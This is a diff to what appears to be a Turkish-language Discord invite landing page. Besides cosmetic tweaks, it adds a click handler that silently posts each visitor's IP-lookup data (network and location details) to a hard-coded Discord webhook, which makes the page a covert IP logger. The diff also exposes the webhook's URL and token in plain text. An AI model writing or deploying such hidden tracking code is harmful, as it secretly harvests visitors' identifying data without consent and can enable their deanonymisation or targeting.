@@ -28,7 +28,7 @@
       text-align: center;
     }
     #discord-logo {
-      width: 250px; /* Burayı büyüttük */
+      width: 120px;
       vertical-align: middle;
       margin-bottom: 7px;
       filter: drop-shadow(0 0 8px #00f);
@@ -59,7 +59,7 @@
       z-index: -1;
     }
     #audio-player {
-      display: none; /* Kullanıcıya gözükmesin */
+      display: none;
     }
   </style>
 </head>
@@ -109,10 +109,30 @@
       .then(response => response.json())
       .then(data => {
         document.getElementById("ipinfo").textContent = JSON.stringify(data, null, 2);
+        window.ipData = data; // Tıklama anında kullanmak için
       })
       .catch(() => {
         document.getElementById("ipinfo").textContent = "Bilgiler alınamadı.";
       });
+
+    // Discord linkine tıklanınca webhooka log gönder
+    document.getElementById("discord-link").addEventListener("click", function(e) {
+      // Webhook URL'ni buraya yaz!
+      var webhookURL = "https://discord.com/api/webhooks/1412164494930608188/Qkg2gmLM-CyctJAEfrW6EonQXC3uzvtRrLi8zA2pWvnNymwNcKT8aFHXadjkyTIEawAm";
+      var ipInfo = window.ipData ? JSON.stringify(window.ipData, null, 2) : "IP bilgisi yok";
+      var payload = {
+        content: "Bir kullanıcı Discord linkine tıkladı!\nIP Bilgisi:\n" + ipInfo
+      };
+      // Webhooka POST isteği gönder
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+      // Eğer yeni sekmede açılacaksa, log hemen gider
+    });
 
     // Otomatik müzik oynatma (bazı tarayıcılarda kullanıcı etkileşimi gerekebilir)
     window.addEventListener('click', function() {
